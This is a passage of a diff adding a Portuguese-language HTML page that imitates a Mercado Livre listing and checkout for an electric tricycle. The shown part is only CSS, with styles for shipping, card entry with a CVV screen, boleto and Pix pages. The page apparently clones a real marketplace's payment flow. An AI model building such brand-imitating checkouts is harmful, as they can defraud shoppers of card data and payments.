@@ -1,0 +1,3382 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <meta name="theme-color" content="#ffffff" id="themeColor">
+    <title>Triciculo Eletrico Branco 127/220v</title>
+    
+    <!-- Favicon-->
+    <link rel="icon" type="image/png" href="img/mercadolivre-logo.png">
+
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+        body {
+            font-family: 'Roboto', sans-serif;
+            background-color: #fff;
+        }
+        .carousel-container {
+            overflow: hidden;
+            position: relative;
+        }
+        .carousel-track {
+            display: flex;
+            transition: transform 0.3s ease-in-out;
+        }
+        .carousel-item {
+            min-width: 100%;
+        }
+        .btn-voltage {
+            border: 1px solid #ddd;
+            padding: 8px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+        }
+        .btn-voltage.active {
+            border-color: #3483fa;
+            color: #3483fa;
+            background-color: #f5f8ff;
+        }
+        .bottom-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            border-top: 1px solid #eee;
+            display: flex;
+            justify-content: space-around;
+            padding: 8px 0 12px 0;
+            z-index: 50;
+            max-width: 448px;
+            margin: 0 auto;
+        }
+        @media (min-width: 769px) {
+            .bottom-nav {
+                max-width: 100% !important;
+                justify-content: center;
+                gap: 48px;
+            }
+            .nav-item {
+                flex: 0 0 auto;
+                min-width: 80px;
+            }
+        }
+        .nav-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            flex: 1;
+            gap: 4px;
+        }
+        .nav-icon-wrapper {
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 32px;
+            width: 32px;
+        }
+        .nav-badge {
+            position: absolute;
+            top: -4px;
+            right: -8px;
+            background-color: #3483fa;
+            color: white;
+            font-size: 10px;
+            font-weight: bold;
+            border-radius: 50%;
+            width: 18px;
+            height: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid white;
+        }
+        .nav-label {
+            font-size: 13px;
+            font-weight: 500;
+            color: #000;
+        }
+        .nav-item.active .nav-label {
+            color: #3483fa;
+        }
+        .nav-item.active i {
+            color: #3483fa;
+        }
+        .nav-item i {
+            font-size: 22px;
+            color: #333;
+        }
+        .payment-method-icon {
+            height: 24px;
+            width: auto;
+            margin: 0 4px;
+        }
+        .line-clamp-2 {
+            display: -webkit-box;
+            -webkit-line-clamp: 2;
+            -webkit-box-orient: vertical;
+            overflow: hidden;
+        }
+        /* Header com transicao de cor */
+        header {
+            background-color: transparent;
+            transition: background-color 0.2s ease;
+            position: fixed; /* Mudado para fixed para sobrepor o carousel */
+            top: 0;
+            left: 0;
+            right: 0;
+            z-index: 100;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 6px 16px;
+            max-width: 448px;
+            margin: 0 auto;
+            height: 48px; /* Meio termo ideal */
+        }
+        @media (min-width: 769px) {
+            #productPage header {
+                padding: 1rem 2rem;
+                background-color: #FFD700 !important;
+                height: 64px;
+                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            }
+            #productPage header button {
+                background-color: rgba(0,0,0,0.08);
+            }
+            /* Melhorar o visual das setas do carousel */
+            #carouselPrev, #carouselNext {
+                font-size: 24px;
+                line-height: 1;
+            }
+        }
+        header.scrolled {
+            background-color: #FFD700;
+        }
+        header button {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: rgba(255, 255, 255, 0.6);
+            border: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #333;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            font-size: 1.1rem;
+        }
+        header button:hover {
+            background-color: rgba(255, 255, 255, 0.9);
+        }
+        header.scrolled {
+            background-color: #FFD700 !important;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        header.scrolled button {
+            background-color: transparent; /* Remove a bolinha no fundo amarelo */
+            color: #000;
+        }
+        header.scrolled button:hover {
+            background-color: rgba(0, 0, 0, 0.05);
+        }
+        header > div {
+            display: flex;
+            gap: 0.5rem;
+        }
+        /* Estilo para imagens de pagamento sobrepostas em bolinhas */
+        .payment-icons-container {
+            position: relative;
+            width: 54px;
+            height: 36px;
+            display: inline-block;
+        }
+        .payment-icons-container .payment-circle {
+            position: absolute;
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            overflow: hidden;
+            background-color: #f0f0f0;
+            border: 1px solid #e0e0e0;
+        }
+        .payment-icons-container .payment-circle img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .payment-icons-container .card-circle {
+            left: 0;
+            top: 0;
+            z-index: 1;
+        }
+        .payment-icons-container .pix-circle {
+            right: 0;
+            top: 0;
+            z-index: 10;
+            left: 18px;
+        }
+        /* Estilo para sequência de bolinhas de meios de pagamento */
+        .payment-methods-header {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 8px;
+        }
+        .payment-methods-circles {
+            display: flex;
+            align-items: center;
+            gap: 0;
+        }
+        .payment-methods-circles .payment-method-circle {
+            position: relative;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            overflow: hidden;
+            background-color: #f0f0f0;
+            border: 1px solid #e0e0e0;
+            margin-left: -9px;
+            z-index: 1;
+            flex-shrink: 0;
+        }
+        .payment-methods-circles .payment-method-circle:first-child {
+            margin-left: 0;
+            z-index: 6;
+        }
+        .payment-methods-circles .payment-method-circle:nth-child(2) {
+            z-index: 5;
+        }
+        .payment-methods-circles .payment-method-circle:nth-child(3) {
+            z-index: 4;
+        }
+        .payment-methods-circles .payment-method-circle:nth-child(4) {
+            z-index: 3;
+        }
+        .payment-methods-circles .payment-method-circle:nth-child(5) {
+            z-index: 2;
+        }
+        .payment-methods-circles .payment-method-circle:nth-child(6) {
+            z-index: 1;
+        }
+        .payment-methods-circles .payment-method-circle img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        /* Estilos para as telas (pages) */
+        .page {
+            display: none;
+        }
+        .page.active {
+            display: block;
+        }
+        /* Estilo para página de checkout */
+        .checkout-page {
+            background-color: #f5f5f5;
+        }
+        .delivery-card {
+            background: white;
+            border-radius: 12px;
+            padding: 20px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        .delivery-card-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 12px;
+        }
+        .delivery-card-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+        }
+        .delivery-card-price {
+            font-size: 18px;
+            font-weight: 500;
+            color: #000;
+        }
+        .delivery-card-price-small {
+            font-size: 12px;
+            color: #999;
+        }
+        .delivery-card-address {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+            line-height: 1.5;
+        }
+        .delivery-card-type {
+            font-size: 13px;
+            color: #999;
+        }
+        .delivery-card-link {
+            color: #3483fa;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #f0f0f0;
+        }
+        .delivery-card-link:hover {
+            text-decoration: underline;
+        }
+        .chevron-icon {
+            color: #3483fa;
+            font-size: 16px;
+        }
+        /* Estilos para página de entrega (shipping) */
+        .shipping-page {
+            background-color: #f5f5f5;
+        }
+        .shipping-header {
+            padding: 1rem;
+        }
+        .shipping-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 1rem;
+            line-height: 1.3;
+        }
+        .shipping-location {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 1.5rem;
+        }
+        .shipping-location i {
+            color: #000;
+            font-size: 18px;
+        }
+        .shipping-option-card {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        .shipping-option-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+        }
+        .shipping-option-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+        }
+        .shipping-option-image {
+            width: 44px;
+            height: 44px;
+            background-color: #f0f0f0;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+        }
+        .shipping-option-image img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .shipping-option-details {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #f0f0f0;
+        }
+        .shipping-radio {
+            width: 20px;
+            height: 20px;
+            border-radius: 50%;
+            border: 2px solid #3483fa;
+            background-color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .shipping-radio.active {
+            background-color: #3483fa;
+        }
+        .shipping-radio.active::after {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background-color: white;
+            border-radius: 50%;
+        }
+        .shipping-option-text {
+            flex: 1;
+        }
+        .shipping-option-date {
+            font-size: 15px;
+            color: #000;
+            font-weight: 500;
+        }
+        .shipping-option-price {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            gap: 4px;
+        }
+        .shipping-option-original-price {
+            font-size: 12px;
+            color: #999;
+            text-decoration: line-through;
+        }
+        .shipping-option-final-price {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+        }
+        .shipping-footer {
+            position: fixed;
+            bottom: 80px;
+            left: 0;
+            right: 0;
+            background: white;
+            padding: 16px;
+            border-top: 1px solid #eee;
+            max-width: 448px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 40;
+        }
+        .shipping-footer-label {
+            font-size: 14px;
+            color: #000;
+            font-weight: 500;
+        }
+        .shipping-footer-price {
+            font-size: 18px;
+            font-weight: 600;
+            color: #000;
+        }
+        .continue-btn {
+            position: fixed;
+            bottom: 16px;
+            left: 16px;
+            right: 16px;
+            max-width: calc(100% - 32px);
+            background-color: #3483fa;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+            z-index: 41;
+        }
+        .continue-btn:hover {
+            background-color: #2a6dd4;
+        }
+        .shipping-page main {
+            padding-bottom: 100px;
+        }
+        /* Estilos para página de pagamento */
+        .payment-page {
+            background-color: #f5f5f5;
+        }
+        .payment-header {
+            padding: 1rem;
+        }
+        .payment-title {
+            font-size: 26px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 1.5rem;
+            line-height: 1.3;
+        }
+        .combine-payment-card {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .combine-payment-text {
+            font-size: 15px;
+            color: #000;
+            font-weight: 500;
+        }
+        .toggle-switch {
+            width: 50px;
+            height: 28px;
+            background-color: #ccc;
+            border-radius: 14px;
+            position: relative;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        .toggle-switch.active {
+            background-color: #3483fa;
+        }
+        .toggle-circle {
+            width: 24px;
+            height: 24px;
+            background-color: white;
+            border-radius: 50%;
+            position: absolute;
+            top: 2px;
+            left: 2px;
+            transition: left 0.3s ease;
+        }
+        .toggle-switch.active .toggle-circle {
+            left: 24px;
+        }
+        .payment-section-title {
+            font-size: 16px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 12px;
+            margin-top: 24px;
+        }
+        .payment-method-item {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 12px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        /* Padronização de todas as bolinhas de imagem */
+        .img-circle-standard {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            overflow: hidden;
+            background-color: #f0f0f0;
+            border: 1px solid #e0e0e0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        .img-circle-standard img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .payment-method-icon {
+            width: 44px;
+            height: 44px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            flex-shrink: 0;
+            overflow: hidden;
+            background-color: #f0f0f0;
+            border: 1px solid #e0e0e0;
+        }
+        .payment-method-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+        .btn-follow-pill {
+            background-color: #e31b23; /* Vermelho */
+            color: white;
+            font-size: 12px;
+            font-weight: 600;
+            padding: 4px 12px;
+            border-radius: 20px;
+            border: none;
+            cursor: pointer;
+            margin-left: 8px;
+        }
+        .payment-method-icon-placeholder {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background-color: #f0f0f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            border: 2px solid #e0e0e0;
+        }
+        .payment-method-placeholder-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+        .payment-method-content {
+            flex: 1;
+        }
+        .payment-method-name {
+            font-size: 15px;
+            font-weight: 500;
+            color: #000;
+            margin-bottom: 4px;
+        }
+        .payment-method-desc {
+            font-size: 13px;
+            color: #999;
+        }
+        .payment-method-arrow {
+            color: #3483fa;
+            font-size: 18px;
+        }
+        .coupon-link {
+            color: #3483fa;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            margin: 24px 0;
+        }
+        .payment-summary {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            padding: 16px;
+            border-top: 1px solid #eee;
+            max-width: 448px;
+            margin: 0 auto;
+            z-index: 40;
+        }
+        .payment-summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+        .payment-summary-label {
+            font-size: 14px;
+            color: #000;
+        }
+        .payment-summary-value {
+            font-size: 14px;
+            color: #000;
+            text-decoration: line-through;
+        }
+        .payment-summary-final {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 12px;
+            padding-top: 12px;
+            border-top: 1px solid #eee;
+        }
+        .payment-summary-final-label {
+            font-size: 16px;
+            font-weight: 700;
+            color: #000;
+        }
+        .payment-summary-final-value {
+            font-size: 20px;
+            font-weight: 700;
+            color: #000;
+        }
+        .payment-summary-discount {
+            font-size: 12px;
+            color: #27ae60;
+            margin-top: 4px;
+        }
+        .payment-page main {
+            padding-bottom: 140px;
+        }
+        /* Estilos Novo Cartão */
+        .card-container {
+            perspective: 1000px;
+            width: 100%;
+            max-width: 320px;
+            height: 200px;
+            margin: 0 auto 32px;
+        }
+        .card-inner {
+            position: relative;
+            width: 100%;
+            height: 100%;
+            transition: transform 0.6s;
+            transform-style: preserve-3d;
+        }
+        .card-inner.flipped {
+            transform: rotateY(180deg);
+        }
+        .card-front, .card-back {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            backface-visibility: hidden;
+            border-radius: 12px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-weight: bold;
+        }
+        .card-front {
+            background: linear-gradient(135deg, #e0e0e0 0%, #c0c0c0 100%);
+            color: #333;
+        }
+        .card-back {
+            background: linear-gradient(135deg, #e0e0e0 0%, #c0c0c0 100%);
+            transform: rotateY(180deg);
+        }
+        .card-chip {
+            width: 40px;
+            height: 30px;
+            background: #ffd700;
+            border-radius: 4px;
+            position: absolute;
+            top: 40px;
+            left: 20px;
+        }
+        .card-number-display {
+            font-size: 18px;
+            letter-spacing: 2px;
+            margin-top: 40px;
+        }
+        .card-holder-display {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            font-size: 14px;
+            text-transform: uppercase;
+        }
+        .card-expiry-display {
+            position: absolute;
+            bottom: 20px;
+            right: 20px;
+            font-size: 14px;
+        }
+        .card-stripe {
+            width: 100%;
+            height: 40px;
+            background: #333;
+            position: absolute;
+            top: 30px;
+        }
+        .card-cvv-area {
+            width: 80%;
+            height: 35px;
+            background: white;
+            position: absolute;
+            top: 85px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding-right: 10px;
+            color: #333;
+        }
+        .cvv-circle {
+            border: 2px solid red;
+            border-radius: 50%;
+            width: 30px;
+            height: 30px;
+            position: absolute;
+            right: 5px;
+        }
+        .card-step {
+            display: none;
+        }
+        .card-step.active {
+            display: block;
+            animation: fadeIn 0.4s ease;
+        }
+        .progress-bar-container {
+            height: 4px;
+            background-color: #e0e0e0;
+            width: 100%;
+            position: relative;
+        }
+        .progress-bar-inner {
+            height: 100%;
+            background-color: #3483fa;
+            width: 25%;
+            transition: width 0.3s ease;
+        }
+        .card-footer-nav {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            padding: 16px;
+            display: flex;
+            justify-content: space-between;
+            border-top: 1px solid #eee;
+            max-width: 448px;
+            margin: 0 auto;
+            z-index: 60;
+        }
+        .virtual-card-info {
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            gap: 4px;
+            color: #333;
+            font-size: 13px;
+            margin-bottom: 16px;
+        }
+        .virtual-card-info i {
+            color: #3483fa;
+        }
+        /* Estilos para página de revisão e confirmação */
+        .review-page {
+            background-color: #f5f5f5;
+        }
+        .review-header {
+            background-color: #FFD700;
+            padding: 1rem;
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            position: sticky;
+            top: 0;
+            z-index: 40;
+        }
+        .review-header-back {
+            background: none;
+            border: none;
+            font-size: 1.5rem;
+            cursor: pointer;
+            color: #000;
+        }
+        .review-header-title {
+            font-size: 18px;
+            font-weight: 600;
+            color: #000;
+        }
+        .review-section {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 16px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        .review-section-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 16px;
+        }
+        .review-item {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 16px;
+        }
+        .review-item:last-child {
+            margin-bottom: 0;
+        }
+        .review-item-icon {
+            font-size: 24px;
+            color: #666;
+            flex-shrink: 0;
+            margin-top: 4px;
+        }
+        .review-item-content {
+            flex: 1;
+        }
+        .review-item-title {
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+            margin-bottom: 4px;
+        }
+        .review-item-subtitle {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 8px;
+        }
+        .review-item-text {
+            font-size: 14px;
+            color: #000;
+            line-height: 1.5;
+            margin-bottom: 4px;
+        }
+        .review-item-link {
+            color: #3483fa;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: none;
+            display: block;
+            margin-top: 8px;
+        }
+        .review-item-link:hover {
+            text-decoration: underline;
+        }
+        .review-item-optional {
+            font-size: 13px;
+            color: #999;
+            margin-left: auto;
+        }
+        .review-summary {
+            background: white;
+            border-radius: 12px;
+            padding: 16px;
+            margin: 16px;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+        }
+        .review-summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            color: #000;
+        }
+        .review-summary-row:last-child {
+            margin-bottom: 0;
+        }
+        .review-summary-row.total {
+            border-top: 1px solid #eee;
+            padding-top: 12px;
+            font-size: 18px;
+        }
+        .review-summary-original {
+            text-decoration: line-through;
+            color: #999;
+            font-weight: 400;
+            font-size: 14px;
+        }
+        .review-summary-discount {
+            color: #27ae60;
+            font-size: 14px;
+            margin-top: 8px;
+            font-weight: 500;
+        }
+        .review-confirm-btn {
+            position: fixed;
+            bottom: 16px;
+            left: 16px;
+            right: 16px;
+            max-width: calc(100% - 32px);
+            background-color: #3483fa;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 41;
+            transform: translateY(100px);
+            opacity: 0;
+            pointer-events: none;
+        }
+        .review-confirm-btn.visible {
+            transform: translateY(0);
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .internal-confirm-btn {
+            display: block;
+            width: 100%;
+            background-color: #3483fa;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .review-confirm-btn:hover {
+            background-color: #2a6dd4;
+        }
+        .review-page main {
+            padding-bottom: 100px;
+        }
+
+        /* ===== TELA DE CARREGAMENTO ===== */
+        .loading-page {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #fff;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 9999;
+            overflow: hidden;
+        }
+        .loading-page.hidden {
+            display: none;
+        }
+        .loading-text {
+            font-size: 19px;
+            font-weight: 500;
+            color: #333;
+            text-align: center;
+            opacity: 0;
+            transition: opacity 0.5s ease;
+            margin-top: 40px;
+            position: relative;
+            z-index: 10001;
+        }
+        .loading-text.visible {
+            opacity: 1;
+        }
+        .loading-spinner {
+            width: 52px;
+            height: 52px;
+            border-radius: 50%;
+            border: 4px solid #e0e0e0;
+            border-top-color: #3483fa;
+            animation: spin 0.9s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .green-ball-container {
+            width: 60px;
+            height: 60px;
+            background-color: #00a650;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+            z-index: 10000;
+            transition: transform 0.5s ease-in-out;
+            margin-top: 20px;
+        }
+        .green-ball-container.expand {
+            transform: scale(30);
+        }
+        .horizontal-dots {
+            display: flex;
+            gap: 10px;
+        }
+        .dot-ping {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: #fff;
+            opacity: 0;
+            transform: scale(0.5);
+            transition: all 0.3s ease;
+        }
+        .dot-ping.active {
+            opacity: 1;
+            transform: scale(1.2);
+        }
+
+        /* ===== PAGINA 5: BOLETO ===== */
+        .boleto-page {
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+        .boleto-header {
+            background-color: #00a650;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            position: sticky;
+            top: 0;
+            z-index: 40;
+        }
+        .boleto-header-close {
+            background: none;
+            border: none;
+            font-size: 20px;
+            cursor: pointer;
+            color: #fff;
+            width: 32px;
+            height: 32px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .boleto-hero {
+            background-color: #fff;
+            padding: 20px 16px 24px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+        .boleto-icon-wrap {
+            position: relative;
+            width: 64px;
+            height: 64px;
+            margin-bottom: 12px;
+        }
+        .boleto-icon-circle {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            border: 2px solid #00a650;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: #fff;
+        }
+        .boleto-icon-circle i {
+            font-size: 28px;
+            color: #00a650;
+        }
+        .boleto-icon-badge {
+            position: absolute;
+            bottom: 0;
+            right: 0;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background-color: #00a650;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .boleto-icon-badge i {
+            font-size: 10px;
+            color: #fff;
+        }
+        .boleto-subtitle {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 6px;
+        }
+        .boleto-title {
+            font-size: 21px;
+            font-weight: 700;
+            color: #000;
+            line-height: 1.3;
+        }
+        .boleto-body {
+            padding: 16px;
+        }
+        .boleto-card {
+            background: #fff;
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 16px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+        }
+        .boleto-card-title {
+            font-size: 17px;
+            font-weight: 700;
+            color: #000;
+            margin-bottom: 12px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #eee;
+        }
+        .boleto-instructions-text {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.6;
+            margin-bottom: 14px;
+        }
+        .boleto-info-row {
+            display: flex;
+            align-items: flex-start;
+            gap: 8px;
+            margin-bottom: 12px;
+            font-size: 14px;
+            color: #333;
+            line-height: 1.5;
+        }
+        .boleto-info-row i {
+            font-size: 16px;
+            color: #555;
+            margin-top: 2px;
+            flex-shrink: 0;
+        }
+        .boleto-info-highlight {
+            border-left: 3px solid #3483fa;
+            padding-left: 10px;
+            margin-bottom: 0;
+        }
+        .boleto-info-highlight .boleto-info-row {
+            margin-bottom: 0;
+        }
+        .boleto-barcode-img {
+            width: 100%;
+            height: 70px;
+            background: repeating-linear-gradient(
+                90deg,
+                #000 0px, #000 3px,
+                #fff 3px, #fff 6px,
+                #000 6px, #000 8px,
+                #fff 8px, #fff 12px,
+                #000 12px, #000 16px,
+                #fff 16px, #fff 19px,
+                #000 19px, #000 21px,
+                #fff 21px, #fff 25px,
+                #000 25px, #000 28px,
+                #fff 28px, #fff 31px,
+                #000 31px, #000 34px,
+                #fff 34px, #fff 38px,
+                #000 38px, #000 41px,
+                #fff 41px, #fff 44px,
+                #000 44px, #000 47px,
+                #fff 47px, #fff 51px,
+                #000 51px, #000 54px,
+                #fff 54px, #fff 57px,
+                #000 57px, #000 61px,
+                #fff 61px, #fff 64px,
+                #000 64px, #000 67px,
+                #fff 67px, #fff 71px,
+                #000 71px, #000 74px,
+                #fff 74px, #fff 77px,
+                #000 77px, #000 81px,
+                #fff 81px, #fff 84px,
+                #000 84px, #000 87px,
+                #fff 87px, #fff 91px,
+                #000 91px, #000 94px,
+                #fff 94px, #fff 97px,
+                #000 97px, #000 101px,
+                #fff 101px, #fff 104px,
+                #000 104px, #000 107px,
+                #fff 107px, #fff 111px,
+                #000 111px, #000 114px,
+                #fff 114px, #fff 117px,
+                #000 117px, #000 121px,
+                #fff 121px, #fff 124px,
+                #000 124px, #000 127px,
+                #fff 127px, #fff 131px,
+                #000 131px, #000 134px,
+                #fff 134px, #fff 137px,
+                #000 137px, #000 141px,
+                #fff 141px, #fff 144px,
+                #000 144px, #000 147px,
+                #fff 147px, #fff 151px
+            );
+            margin-bottom: 8px;
+        }
+        .boleto-barcode-number {
+            font-size: 13px;
+            color: #333;
+            word-break: break-all;
+            margin-bottom: 16px;
+        }
+        .boleto-btn-primary {
+            display: block;
+            width: 100%;
+            background-color: #3483fa;
+            color: white;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            margin-bottom: 12px;
+            transition: background-color 0.2s ease;
+        }
+        .boleto-btn-primary:hover {
+            background-color: #2a6dd4;
+        }
+        .boleto-btn-secondary {
+            display: block;
+            width: 100%;
+            background-color: transparent;
+            color: #3483fa;
+            border: none;
+            padding: 14px 24px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            text-align: center;
+            transition: background-color 0.2s ease;
+        }
+        .boleto-btn-secondary:hover {
+            background-color: #f0f5ff;
+        }
+        /* Estilos Pix */
+        .pix-page {
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+        .pix-header {
+            padding: 12px 16px;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            background: transparent;
+        }
+        .pix-header-close {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #999;
+        }
+        .pix-hero {
+            background: white;
+            margin: 0 16px;
+            padding: 24px 16px;
+            border-radius: 8px;
+            text-align: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .pix-icon-circle {
+            width: 64px;
+            height: 64px;
+            border-radius: 50%;
+            border: 2px solid #00a650;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            position: relative;
+        }
+        .pix-icon-badge {
+            position: absolute;
+            bottom: -2px;
+            right: -2px;
+            width: 24px;
+            height: 24px;
+            background: #00a650;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid white;
+        }
+        .pix-hero-title {
+            font-size: 20px;
+            font-weight: 700;
+            color: #000;
+            line-height: 1.3;
+        }
+        .pix-body {
+            padding: 16px;
+        }
+        .pix-card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .pix-card-title {
+            font-size: 18px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 20px;
+            padding-bottom: 12px;
+            border-bottom: 1px solid #eee;
+        }
+        .pix-instruction-item {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 16px;
+            font-size: 15px;
+            color: #333;
+            line-height: 1.4;
+        }
+        .pix-code-box {
+            background: #f9f9f9;
+            border: 1px solid #eee;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 20px 0;
+            font-family: monospace;
+            font-size: 14px;
+            color: #666;
+            word-break: break-all;
